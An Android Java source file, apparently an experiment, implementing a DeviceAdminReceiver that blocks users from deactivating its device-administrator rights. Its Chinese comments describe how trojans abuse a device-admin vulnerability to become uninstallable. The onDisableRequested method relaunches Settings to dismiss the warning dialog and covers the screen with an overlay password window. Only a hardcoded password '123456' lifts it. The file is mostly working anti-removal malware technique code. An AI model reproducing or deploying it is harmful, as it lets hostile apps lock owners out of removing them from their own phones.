package com.unactive.windowmanager.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.view.Gravity;
import android.view.WindowManager;

import com.yline.log.LogFileUtil;

/**
 * 方式1:某作者,在4.0 & 5.0均测试失败,可以正常取消激活;个人没有验证
 * 方式2:取消过滤器;失败,原因:就算手动激活,也是无法激活成功
 * 方式3:已激活设备管理器权限的手机木马,利用该漏洞,可以在设置程序的设备管理器列表中隐藏,这样用户就无法通过正常途径取消该手机木马的设备管理器权限,从而达到无法卸载的目的.
 * Android4.2版本以上系统已经修复该漏洞.
 * ...
 * 通过调用stopAPPSwitch方法,系统保证在进入取消设备管理器界面后,5秒内不会进行Activity的切换。
 * ...
 * onDisableRequest函数满足一下条件即可:
 * 1、返回内容不能为空,这样才可以使设备管理器弹出取消激活设备管理器警示信息Dialog(这个人为不能够修改)
 * 2、通过Activity切换的方式,使设备管理器弹出的警示信息Dialog消失。使得用户无法操作Dialog。
 * 如果做到以上两点,程序即可成功阻止用户取消激活设备管理器操作
 * <p/>
 * <以上两点来自于  百度安全实验室一篇文章《Android设备管理器漏洞2》>
 * 该方式,实现成功
 */
public class PassViewReceiver extends DeviceAdminReceiver
{
	private static final String TAG = "PassViewReceiver";

	private static final String RESULT_TOAST_NOFUNCTION = "(づ￣3￣)づ╭❤～不要取消哦";

	private static final String RESULT_TOAST_INFUNCTION = "取消激活成功";

	private static final String HINT_CONTENT_NULL = "请输入密码";

	private static final String HINT_CONTENT_JUDGE = "正在校验，请稍后";

	private static final String HINT_CONTENT_JUDGE_SUCCESS = "校验正确，请静候界面消失";

	private static final String HINT_CONTENT_JUDGE_ERROR = "失败，剩余次数:";

	private static final String HINT_CONTENT_LIMIT = "校验次数，已达上限，按回退健到底可清零";

	private static final int MAX_ERROR_NUMBER = 5;

	private int mErrorNumber = 0;

	private boolean isClearOpen = false; // 次数清零,是否开启

	@Override
	public CharSequence onDisableRequested(final Context context, Intent intent)
	{
		LogFileUtil.v(TAG, "onDisableRequested is runned");
		String dialogContent = RESULT_TOAST_NOFUNCTION;

		if (PassViewReceiver.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED.equals(intent.getAction()))
		{
			LogFileUtil.v(TAG, "onDisableRequested -> disable_requested in action");
			dialogContent = RESULT_TOAST_INFUNCTION;

			// 跳离当前询问是否取消激活的 dialog 必要
			Intent outIntent = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
			outIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(outIntent);

			// 不可编辑设备; context.getApplicationContext(),消失时间=休眠时间+10s
			final WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
			final PasswordView passwordView = new PasswordView(context);
			passwordView.setHintMessage(HINT_CONTENT_NULL);
			passwordView.setOnInputFinishListener(new PasswordView.InputFinishListener()
			{

				@Override
				public void onResult(String result)
				{
					LogFileUtil.v(TAG, "onDisableRequested -> mErrorNumber = " + mErrorNumber + ",userPwd = " + result);

					if (mErrorNumber < MAX_ERROR_NUMBER)
					{
						passwordView.setHintMessage(HINT_CONTENT_JUDGE);

						if ("123456".equals(result))
						{
							passwordView.setHintMessage(HINT_CONTENT_JUDGE_SUCCESS);

							// 手动取消激活
							DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
							devicePolicyManager.removeActiveAdmin(new ComponentName(context, PassViewReceiver.class));

							windowManager.removeView(passwordView);
						}
						else
						{
							mErrorNumber++;
							passwordView.setHintMessage(HINT_CONTENT_JUDGE_ERROR + (MAX_ERROR_NUMBER - mErrorNumber));
						}
					}
					else
					{
						passwordView.setHintMessage(HINT_CONTENT_LIMIT);
						isClearOpen = true;
					}
				}
			});

			passwordView.setOnInputEmptyListener(new PasswordView.InputEmptyListener()
			{

				@Override
				public void onEmpty()
				{
					LogFileUtil.v(TAG, "onDisableRequested -> InputEmptyListener");
					passwordView.setHintMessage(HINT_CONTENT_NULL);
					if (isClearOpen)
					{
						mErrorNumber = 0;
						isClearOpen = false;
					}
				}
			});

			windowManager.addView(passwordView, getLayoutParams());

			// 停止当前服务
			context.stopService(intent);
		}
		LogFileUtil.v(TAG, "onDisableRequested -> dialogContent = " + dialogContent);
		return dialogContent;
	}

	@Override
	public void onDisabled(Context context, Intent intent)
	{
		super.onDisabled(context, intent);
		LogFileUtil.v(TAG, "onDisabled is runned");
	}

	/**
	 * 设置LayoutParams参数
	 *
	 * @return
	 */
	private WindowManager.LayoutParams getLayoutParams()
	{
		WindowManager.LayoutParams params = new WindowManager.LayoutParams();
		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN_MR2)
		{
			// 可以避免悬浮框权限,但api18及以下无法点击
			params.type = WindowManager.LayoutParams.TYPE_TOAST;
		}
		else
		{
			params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
		}

		params.format = android.graphics.PixelFormat.RGBA_8888;
		params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
		params.flags = (0x40000 | params.flags);
		params.flags = (0x200 | params.flags);
		params.alpha = 1.0F;
		params.gravity = Gravity.CENTER;
		params.x = Gravity.NO_GRAVITY;
		params.y = Gravity.NO_GRAVITY;
		return params;
	}
}
